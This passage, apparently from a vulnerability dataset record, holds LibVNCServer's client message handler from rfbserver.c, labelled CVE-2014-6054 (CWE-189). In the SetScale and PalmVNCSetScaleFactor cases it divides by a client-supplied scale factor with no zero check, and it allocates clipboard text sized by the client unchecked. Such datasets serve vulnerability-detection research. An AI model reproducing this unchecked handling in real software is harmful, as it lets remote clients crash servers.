Swap16IfLE(msg.spf.format.greenMax);\n        cl->format.blueMax = Swap16IfLE(msg.spf.format.blueMax);\n        cl->format.redShift = msg.spf.format.redShift;\n        cl->format.greenShift = msg.spf.format.greenShift;\n        cl->format.blueShift = msg.spf.format.blueShift;\n\n\tcl->readyForSetColourMapEntries = TRUE;\n        cl->screen->setTranslateFunction(cl);\n\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetPixelFormatMsg, sz_rfbSetPixelFormatMsg);\n\n        return;\n\n\n    case rfbFixColourMapEntries:\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                           sz_rfbFixColourMapEntriesMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetPixelFormatMsg, sz_rfbSetPixelFormatMsg);\n        rfbLog(\"rfbProcessClientNormalMessage: %s\",\n                \"FixColourMapEntries unsupported\\n\");\n        rfbCloseClient(cl);\n        return;\n\n\n    /* NOTE: Some clients send us a set of encodings (ie: PointerPos) designed to enable/disable features...\n     * We may want to look into this...\n     * Example:\n     *     case rfbEncodingXCursor:\n     *         cl->enableCursorShapeUpdates = TRUE;\n     *\n     * Currently: cl->enableCursorShapeUpdates can *never* be turned off...\n     */\n    case rfbSetEncodings:\n    {\n\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                           sz_rfbSetEncodingsMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n\n        msg.se.nEncodings = Swap16IfLE(msg.se.nEncodings);\n\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetEncodingsMsg+(msg.se.nEncodings*4),sz_rfbSetEncodingsMsg+(msg.se.nEncodings*4));\n\n        /*\n         * UltraVNC Client has the ability to adapt to changing network environments\n         * So, let's give it a change to tell us what it wants now!\n         */\n        if (cl->preferredEncoding!=-1)\n            lastPreferredEncoding = cl->preferredEncoding;\n\n        /* Reset all flags to defaults (allows us to switch between PointerPos and Server Drawn Cursors) */\n        cl->preferredEncoding=-1;\n        cl->useCopyRect              = FALSE;\n        cl->useNewFBSize             = FALSE;\n        cl->cursorWasChanged         = FALSE;\n        cl->useRichCursorEncoding    = FALSE;\n        cl->enableCursorPosUpdates   = FALSE;\n        cl->enableCursorShapeUpdates = FALSE;\n        cl->enableCursorShapeUpdates = FALSE;\n        cl->enableLastRectEncoding   = FALSE;\n        cl->enableKeyboardLedState   = FALSE;\n        cl->enableSupportedMessages  = FALSE;\n        cl->enableSupportedEncodings = FALSE;\n        cl->enableServerIdentity     = FALSE;\n#if defined(LIBVNCSERVER_HAVE_LIBZ) || defined(LIBVNCSERVER_HAVE_LIBPNG)\n        cl->tightQualityLevel        = -1;\n#ifdef LIBVNCSERVER_HAVE_LIBJPEG\n        cl->tightCompressLevel       = TIGHT_DEFAULT_COMPRESSION;\n        cl->turboSubsampLevel        = TURBO_DEFAULT_SUBSAMP;\n        cl->turboQualityLevel        = -1;\n#endif\n#endif\n\n\n        for (i = 0; i < msg.se.nEncodings; i++) {\n            if ((n = rfbReadExact(cl, (char *)&enc, 4)) <= 0) {\n                if (n != 0)\n                    rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n                rfbCloseClient(cl);\n                return;\n            }\n            enc = Swap32IfLE(enc);\n\n            switch (enc) {\n\n            case rfbEncodingCopyRect:\n\t\tcl->useCopyRect = TRUE;\n                break;\n            case rfbEncodingRaw:\n            case rfbEncodingRRE:\n            case rfbEncodingCoRRE:\n            case rfbEncodingHextile:\n            case rfbEncodingUltra:\n#ifdef LIBVNCSERVER_HAVE_LIBZ\n\t    case rfbEncodingZlib:\n            case rfbEncodingZRLE:\n            case rfbEncodingZYWRLE:\n#ifdef LIBVNCSERVER_HAVE_LIBJPEG\n\t    case rfbEncodingTight:\n#endif\n#endif\n#ifdef LIBVNCSERVER_HAVE_LIBPNG\n\t    case rfbEncodingTightPng:\n#endif\n            /* The first supported encoding is the 'preferred' encoding */\n                if (cl->preferredEncoding == -1)\n                    cl->preferredEncoding = enc;\n\n\n                break;\n\t    case rfbEncodingXCursor:\n\t\tif(!cl->screen->dontConvertRichCursorToXCursor) {\n\t\t    rfbLog(\"Enabling X-style cursor updates for client %s\\n\",\n\t\t\t   cl->host);\n\t\t    /* if cursor was drawn, hide the cursor */\n\t\t    if(!cl->enableCursorShapeUpdates)\n\t\t        rfbRedrawAfterHideCursor(cl,NULL);\n\n\t\t    cl->enableCursorShapeUpdates = TRUE;\n\t\t    cl->cursorWasChanged = TRUE;\n\t\t}\n\t\tbreak;\n\t    case rfbEncodingRichCursor:\n\t        rfbLog(\"Enabling full-color cursor updates for client %s\\n\",\n\t\t       cl->host);\n\t\t/* if cursor was drawn, hide the cursor */\n\t\tif(!cl->enableCursorShapeUpdates)\n\t\t    rfbRedrawAfterHideCursor(cl,NULL);\n\n\t        cl->enableCursorShapeUpdates = TRUE;\n\t        cl->useRichCursorEncoding = TRUE;\n\t        cl->cursorWasChanged = TRUE;\n\t        break;\n\t    case rfbEncodingPointerPos:\n\t\tif (!cl->enableCursorPosUpdates) {\n\t\t    rfbLog(\"Enabling cursor position updates for client %s\\n\",\n\t\t\t   cl->host);\n\t\t    cl->enableCursorPosUpdates = TRUE;\n\t\t    cl->cursorWasMoved = TRUE;\n\t\t}\n\t        break;\n\t    case rfbEncodingLastRect:\n\t\tif (!cl->enableLastRectEncoding) {\n\t\t    rfbLog(\"Enabling LastRect protocol extension for client \"\n\t\t\t   \"%s\\n\", cl->host);\n\t\t    cl->enableLastRectEncoding = TRUE;\n\t\t}\n\t\tbreak;\n\t    case rfbEncodingNewFBSize:\n\t\tif (!cl->useNewFBSize) {\n\t\t    rfbLog(\"Enabling NewFBSize protocol extension for client \"\n\t\t\t   \"%s\\n\", cl->host);\n\t\t    cl->useNewFBSize = TRUE;\n\t\t}\n\t\tbreak;\n            case rfbEncodingKeyboardLedState:\n                if (!cl->enableKeyboardLedState) {\n                  rfbLog(\"Enabling KeyboardLedState protocol extension for client \"\n                          \"%s\\n\", cl->host);\n                  cl->enableKeyboardLedState = TRUE;\n                }\n                break;           \n            case rfbEncodingSupportedMessages:\n                if (!cl->enableSupportedMessages) {\n                  rfbLog(\"Enabling SupportedMessages protocol extension for client \"\n                          \"%s\\n\", cl->host);\n                  cl->enableSupportedMessages = TRUE;\n                }\n                break;           \n            case rfbEncodingSupportedEncodings:\n                if (!cl->enableSupportedEncodings) {\n                  rfbLog(\"Enabling SupportedEncodings protocol extension for client \"\n                          \"%s\\n\", cl->host);\n                  cl->enableSupportedEncodings = TRUE;\n                }\n                break;           \n            case rfbEncodingServerIdentity:\n                if (!cl->enableServerIdentity) {\n                  rfbLog(\"Enabling ServerIdentity protocol extension for client \"\n                          \"%s\\n\", cl->host);\n                  cl->enableServerIdentity = TRUE;\n                }\n                break;\n\t    case rfbEncodingXvp:\n\t        rfbLog(\"Enabling Xvp protocol extension for client \"\n\t\t        \"%s\\n\", cl->host);\n\t\tif (!rfbSendXvp(cl, 1, rfbXvp_Init)) {\n\t\t  rfbCloseClient(cl);\n\t\t  return;\n\t\t}\n                break;\n            default:\n#if defined(LIBVNCSERVER_HAVE_LIBZ) || defined(LIBVNCSERVER_HAVE_LIBPNG)\n\t\tif ( enc >= (uint32_t)rfbEncodingCompressLevel0 &&\n\t\t     enc <= (uint32_t)rfbEncodingCompressLevel9 ) {\n\t\t    cl->zlibCompressLevel = enc & 0x0F;\n#ifdef LIBVNCSERVER_HAVE_LIBJPEG\n\t\t    cl->tightCompressLevel = enc & 0x0F;\n\t\t    rfbLog(\"Using compression level %d for client %s\\n\",\n\t\t\t   cl->tightCompressLevel, cl->host);\n#endif\n\t\t} else if ( enc >= (uint32_t)rfbEncodingQualityLevel0 &&\n\t\t\t    enc <= (uint32_t)rfbEncodingQualityLevel9 ) {\n\t\t    cl->tightQualityLevel = enc & 0x0F;\n\t\t    rfbLog(\"Using image quality level %d for client %s\\n\",\n\t\t\t   cl->tightQualityLevel, cl->host);\n#ifdef LIBVNCSERVER_HAVE_LIBJPEG\n\t\t    cl->turboQualityLevel = tight2turbo_qual[enc & 0x0F];\n\t\t    cl->turboSubsampLevel = tight2turbo_subsamp[enc & 0x0F];\n\t\t    rfbLog(\"Using JPEG subsampling %d, Q%d for client %s\\n\",\n\t\t\t   cl->turboSubsampLevel, cl->turboQualityLevel, cl->host);\n\t\t} else if ( enc >= (uint32_t)rfbEncodingFineQualityLevel0 + 1 &&\n\t\t\t    enc <= (uint32_t)rfbEncodingFineQualityLevel100 ) {\n\t\t    cl->turboQualityLevel = enc & 0xFF;\n\t\t    rfbLog(\"Using fine quality level %d for client %s\\n\",\n\t\t\t   cl->turboQualityLevel, cl->host);\n\t\t} else if ( enc >= (uint32_t)rfbEncodingSubsamp1X &&\n\t\t\t    enc <= (uint32_t)rfbEncodingSubsampGray ) {\n\t\t    cl->turboSubsampLevel = enc & 0xFF;\n\t\t    rfbLog(\"Using subsampling level %d for client %s\\n\",\n\t\t\t   cl->turboSubsampLevel, cl->host);\n#endif\n\t\t} else\n#endif\n\t\t{\n\t\t\trfbExtensionData* e;\n\t\t\tfor(e = cl->extensions; e;) {\n\t\t\t\trfbExtensionData* next = e->next;\n\t\t\t\tif(e->extension->enablePseudoEncoding &&\n\t\t\t\t\te->extension->enablePseudoEncoding(cl,\n\t\t\t\t\t\t&e->data, (int)enc))\n\t\t\t\t\t/* ext handles this encoding */\n\t\t\t\t\tbreak;\n\t\t\t\te = next;\n\t\t\t}\n\t\t\tif(e == NULL) {\n\t\t\t\trfbBool handled = FALSE;\n\t\t\t\t/* if the pseudo encoding is not handled by the\n\t\t\t\t   enabled extensions, search through all\n\t\t\t\t   extensions. */\n\t\t\t\trfbProtocolExtension* e;\n\n\t\t\t\tfor(e = rfbGetExtensionIterator(); e;) {\n\t\t\t\t\tint* encs = e->pseudoEncodings;\n\t\t\t\t\twhile(encs && *encs!=0) {\n\t\t\t\t\t\tif(*encs==(int)enc) {\n\t\t\t\t\t\t\tvoid* data = NULL;\n\t\t\t\t\t\t\tif(!e->enablePseudoEncoding(cl, &data, (int)enc)) {\n\t\t\t\t\t\t\t\trfbLog(\"Installed extension pretends to handle pseudo encoding 0x%x, but does not!\\n\",(int)enc);\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\trfbEnableExtension(cl, e, data);\n\t\t\t\t\t\t\t\thandled = TRUE;\n\t\t\t\t\t\t\t\te = NULL;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tencs++;\n\t\t\t\t\t}\n\n\t\t\t\t\tif(e)\n\t\t\t\t\t\te = e->next;\n\t\t\t\t}\n\t\t\t\trfbReleaseExtensionIterator();\n\n\t\t\t\tif(!handled)\n\t\t\t\t\trfbLog(\"rfbProcessClientNormalMessage: \"\n\t\t\t\t\t    \"ignoring unsupported encoding type %s\\n\",\n\t\t\t\t\t    encodingName(enc,encBuf,sizeof(encBuf)));\n\t\t\t}\n\t\t}\n            }\n        }\n\n\n\n        if (cl->preferredEncoding == -1) {\n            if (lastPreferredEncoding==-1) {\n                cl->preferredEncoding = rfbEncodingRaw;\n                rfbLog(\"Defaulting to %s encoding for client %s\\n\", encodingName(cl->preferredEncoding,encBuf,sizeof(encBuf)),cl->host);\n            }\n            else {\n                cl->preferredEncoding = lastPreferredEncoding;\n                rfbLog(\"Sticking with %s encoding for client %s\\n\", encodingName(cl->preferredEncoding,encBuf,sizeof(encBuf)),cl->host);\n            }\n        }\n        else\n        {\n          if (lastPreferredEncoding==-1) {\n              rfbLog(\"Using %s encoding for client %s\\n\", encodingName(cl->preferredEncoding,encBuf,sizeof(encBuf)),cl->host);\n          } else {\n              rfbLog(\"Switching from %s to %s Encoding for client %s\\n\", \n                  encodingName(lastPreferredEncoding,encBuf2,sizeof(encBuf2)),\n                  encodingName(cl->preferredEncoding,encBuf,sizeof(encBuf)), cl->host);\n          }\n        }\n        \n\tif (cl->enableCursorPosUpdates && !cl->enableCursorShapeUpdates) {\n\t  rfbLog(\"Disabling cursor position updates for client %s\\n\",\n\t\t cl->host);\n\t  cl->enableCursorPosUpdates = FALSE;\n\t}\n\n        return;\n    }\n\n\n    case rfbFramebufferUpdateRequest:\n    {\n        sraRegionPtr tmpRegion;\n\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                           sz_rfbFramebufferUpdateRequestMsg-1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbFramebufferUpdateRequestMsg,sz_rfbFramebufferUpdateRequestMsg);\n\n        /* The values come in based on the scaled screen, we need to convert them to\n         * values based on the main screen's coordinate system\n         */\n\tif(!rectSwapIfLEAndClip(&msg.fur.x,&msg.fur.y,&msg.fur.w,&msg.fur.h,cl))\n\t{\n\t        rfbLog(\"Warning, ignoring rfbFramebufferUpdateRequest: %dXx%dY-%dWx%dH\\n\",msg.fur.x, msg.fur.y, msg.fur.w, msg.fur.h);\n\t\treturn;\n        }\n \n        \n\ttmpRegion =\n\t  sraRgnCreateRect(msg.fur.x,\n\t\t\t   msg.fur.y,\n\t\t\t   msg.fur.x+msg.fur.w,\n\t\t\t   msg.fur.y+msg.fur.h);\n\n        LOCK(cl->updateMutex);\n\tsraRgnOr(cl->requestedRegion,tmpRegion);\n\n\tif (!cl->readyForSetColourMapEntries) {\n\t    /* client hasn't sent a SetPixelFormat so is using server's */\n\t    cl->readyForSetColourMapEntries = TRUE;\n\t    if (!cl->format.trueColour) {\n\t\tif (!rfbSetClientColourMap(cl, 0, 0)) {\n\t\t    sraRgnDestroy(tmpRegion);\n\t\t    TSIGNAL(cl->updateCond);\n\t\t    UNLOCK(cl->updateMutex);\n\t\t    return;\n\t\t}\n\t    }\n\t}\n\n       if (!msg.fur.incremental) {\n\t    sraRgnOr(cl->modifiedRegion,tmpRegion);\n\t    sraRgnSubtract(cl->copyRegion,tmpRegion);\n       }\n       TSIGNAL(cl->updateCond);\n       UNLOCK(cl->updateMutex);\n\n       sraRgnDestroy(tmpRegion);\n\n       return;\n    }\n\n    case rfbKeyEvent:\n\n\tif ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n\t\t\t   sz_rfbKeyEventMsg - 1)) <= 0) {\n\t    if (n != 0)\n\t\trfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n\t    rfbCloseClient(cl);\n\t    return;\n\t}\n\n\trfbStatRecordMessageRcvd(cl, msg.type, sz_rfbKeyEventMsg, sz_rfbKeyEventMsg);\n\n\tif(!cl->viewOnly) {\n\t    cl->screen->kbdAddEvent(msg.ke.down, (rfbKeySym)Swap32IfLE(msg.ke.key), cl);\n\t}\n\n        return;\n\n\n    case rfbPointerEvent:\n\n\tif ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n\t\t\t   sz_rfbPointerEventMsg - 1)) <= 0) {\n\t    if (n != 0)\n\t\trfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n\t    rfbCloseClient(cl);\n\t    return;\n\t}\n\n\trfbStatRecordMessageRcvd(cl, msg.type, sz_rfbPointerEventMsg, sz_rfbPointerEventMsg);\n\t\n\tif (cl->screen->pointerClient && cl->screen->pointerClient != cl)\n\t    return;\n\n\tif (msg.pe.buttonMask == 0)\n\t    cl->screen->pointerClient = NULL;\n\telse\n\t    cl->screen->pointerClient = cl;\n\n\tif(!cl->viewOnly) {\n\t    if (msg.pe.buttonMask != cl->lastPtrButtons ||\n\t\t    cl->screen->deferPtrUpdateTime == 0) {\n\t\tcl->screen->ptrAddEvent(msg.pe.buttonMask,\n\t\t\tScaleX(cl->scaledScreen, cl->screen, Swap16IfLE(msg.pe.x)), \n\t\t\tScaleY(cl->scaledScreen, cl->screen, Swap16IfLE(msg.pe.y)),\n\t\t\tcl);\n\t\tcl->lastPtrButtons = msg.pe.buttonMask;\n\t    } else {\n\t\tcl->lastPtrX = ScaleX(cl->scaledScreen, cl->screen, Swap16IfLE(msg.pe.x));\n\t\tcl->lastPtrY = ScaleY(cl->scaledScreen, cl->screen, Swap16IfLE(msg.pe.y));\n\t\tcl->lastPtrButtons = msg.pe.buttonMask;\n\t    }\n      }      \n      return;\n\n\n    case rfbFileTransfer:\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                              sz_rfbFileTransferMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n        msg.ft.size         = Swap32IfLE(msg.ft.size);\n        msg.ft.length       = Swap32IfLE(msg.ft.length);\n        /* record statistics in rfbProcessFileTransfer as length is filled with garbage when it is not valid */\n        rfbProcessFileTransfer(cl, msg.ft.contentType, msg.ft.contentParam, msg.ft.size, msg.ft.length);\n        return;\n\n    case rfbSetSW:\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                              sz_rfbSetSWMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n        msg.sw.x = Swap16IfLE(msg.sw.x);\n        msg.sw.y = Swap16IfLE(msg.sw.y);\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetSWMsg, sz_rfbSetSWMsg);\n        /* msg.sw.status is not initialized in the ultraVNC viewer and contains random numbers (why???) */\n\n        rfbLog(\"Received a rfbSetSingleWindow(%d x, %d y)\\n\", msg.sw.x, msg.sw.y);\n        if (cl->screen->setSingleWindow!=NULL)\n            cl->screen->setSingleWindow(cl, msg.sw.x, msg.sw.y);\n        return;\n\n    case rfbSetServerInput:\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                              sz_rfbSetServerInputMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetServerInputMsg, sz_rfbSetServerInputMsg);\n\n        /* msg.sim.pad is not initialized in the ultraVNC viewer and contains random numbers (why???) */\n        /* msg.sim.pad = Swap16IfLE(msg.sim.pad); */\n\n        rfbLog(\"Received a rfbSetServerInput(%d status)\\n\", msg.sim.status);\n        if (cl->screen->setServerInput!=NULL)\n            cl->screen->setServerInput(cl, msg.sim.status);\n        return;\n        \n    case rfbTextChat:\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                              sz_rfbTextChatMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n        \n        msg.tc.pad2   = Swap16IfLE(msg.tc.pad2);\n        msg.tc.length = Swap32IfLE(msg.tc.length);\n\n        switch (msg.tc.length) {\n        case rfbTextChatOpen:\n        case rfbTextChatClose:\n        case rfbTextChatFinished:\n            /* commands do not have text following */\n            /* Why couldn't they have used the pad byte??? */\n            str=NULL;\n            rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbTextChatMsg, sz_rfbTextChatMsg);\n            break;\n        default:\n            if ((msg.tc.length>0) && (msg.tc.length<rfbTextMaxSize))\n            {\n                str = (char *)malloc(msg.tc.length);\n                if (str==NULL)\n                {\n                    rfbLog(\"Unable to malloc %d bytes for a TextChat Message\\n\", msg.tc.length);\n                    rfbCloseClient(cl);\n                    return;\n                }\n                if ((n = rfbReadExact(cl, str, msg.tc.length)) <= 0) {\n                    if (n != 0)\n                        rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n                    free(str);\n                    rfbCloseClient(cl);\n                    return;\n                }\n                rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbTextChatMsg+msg.tc.length, sz_rfbTextChatMsg+msg.tc.length);\n            }\n            else\n            {\n                /* This should never happen */\n                rfbLog(\"client sent us a Text Message that is too big %d>%d\\n\", msg.tc.length, rfbTextMaxSize);\n                rfbCloseClient(cl);\n                return;\n            }\n        }\n\n        /* Note: length can be commands: rfbTextChatOpen, rfbTextChatClose, and rfbTextChatFinished\n         * at which point, the str is NULL (as it is not sent)\n         */\n        if (cl->screen->setTextChat!=NULL)\n            cl->screen->setTextChat(cl, msg.tc.length, str);\n\n        free(str);\n        return;\n\n\n    case rfbClientCutText:\n\n\tif ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n\t\t\t   sz_rfbClientCutTextMsg - 1)) <= 0) {\n\t    if (n != 0)\n\t\trfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n\t    rfbCloseClient(cl);\n\t    return;\n\t}\n\n\tmsg.cct.length = Swap32IfLE(msg.cct.length);\n\n\tstr = (char *)malloc(msg.cct.length);\n\tif (str == NULL) {\n\t\trfbLogPerror(\"rfbProcessClientNormalMessage: not enough memory\");\n\t\trfbCloseClient(cl);\n\t\treturn;\n\t}\n\n\tif ((n = rfbReadExact(cl, str, msg.cct.length)) <= 0) {\n\t    if (n != 0)\n\t        rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n\t    free(str);\n\t    rfbCloseClient(cl);\n\t    return;\n\t}\n\trfbStatRecordMessageRcvd(cl, msg.type, sz_rfbClientCutTextMsg+msg.cct.length, sz_rfbClientCutTextMsg+msg.cct.length);\n\tif(!cl->viewOnly) {\n\t    cl->screen->setXCutText(str, msg.cct.length, cl);\n\t}\n\tfree(str);\n\n        return;\n\n    case rfbPalmVNCSetScaleFactor:\n      cl->PalmVNC = TRUE;\n      if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n          sz_rfbSetScaleMsg - 1)) <= 0) {\n          if (n != 0)\n            rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n          rfbCloseClient(cl);\n          return;\n      }\n      rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetScaleMsg, sz_rfbSetScaleMsg);\n      rfbLog(\"rfbSetScale(%d)\\n\", msg.ssc.scale);\n      rfbScalingSetup(cl,cl->screen->width/msg.ssc.scale, cl->screen->height/msg.ssc.scale);\n\n      rfbSendNewScaleSize(cl);\n      return;\n      \n    case rfbSetScale:\n\n      if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n          sz_rfbSetScaleMsg - 1)) <= 0) {\n          if (n != 0)\n            rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n          rfbCloseClient(cl);\n          return;\n      }\n      rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetScaleMsg, sz_rfbSetScaleMsg);\n      rfbLog(\"rfbSetScale(%d)\\n\", msg.ssc.scale);\n      rfbScalingSetup(cl,cl->screen->width/msg.ssc.scale, cl->screen->height/msg.ssc.scale);\n\n      rfbSendNewScaleSize(cl);\n      return;\n\n    case rfbXvp:\n\n      if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n          sz_rfbXvpMsg - 1)) <= 0) {\n          if (n != 0)\n            rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n          rfbCloseClient(cl);\n          return;\n      }\n      rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbXvpMsg, sz_rfbXvpMsg);\n\n      /* only version when is defined, so echo back a fail */\n      if(msg.xvp.version != 1) {\n\trfbSendXvp(cl, msg.xvp.version, rfbXvp_Fail);\n      }\n      else {\n\t/* if the hook exists and fails, send a fail msg */\n\tif(cl->screen->xvpHook && !cl->screen->xvpHook(cl, msg.xvp.version, msg.xvp.code))\n\t  rfbSendXvp(cl, 1, rfbXvp_Fail);\n      }\n      return;\n\n    default:\n\t{\n\t    rfbExtensionData *e,*next;\n\n\t    for(e=cl->extensions; e;) {\n\t\tnext = e->next;\n\t\tif(e->extension->handleMessage &&\n\t\t\te->extension->handleMessage(cl, e->data, &msg))\n                {\n                    rfbStatRecordMessageRcvd(cl, msg.type, 0, 0); /* Extension should handle this */\n\t\t    return;\n                }\n\t\te = next;\n\t    }\n\n\t    rfbLog(\"rfbProcessClientNormalMessage: unknown message type %d\\n\",\n\t\t    msg.type);\n\t    rfbLog(\" ... closing connection\\n\");\n\t    rfbCloseClient(cl);\n\t    return;\n\t}\n    }\n}", "func_hash": 206749608858323158240925181810115653547, "file_name": "rfbserver.c", "file_hash": 163207847579691217468685617129732292067, "cwe": ["CWE-189"], "cve": "CVE-2014-6054", "cve_desc": "The rfbProcessClientNormalMessage function in libvncserver/rfbserver.c in LibVNCServer 0.9.9 and earlier allows remote attackers to cause a denial of service (divide-by-zero error and server crash) via a zero value in the scaling factor in a (1) PalmVNCSetScaleFactor or (2) SetScale message.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6054"}
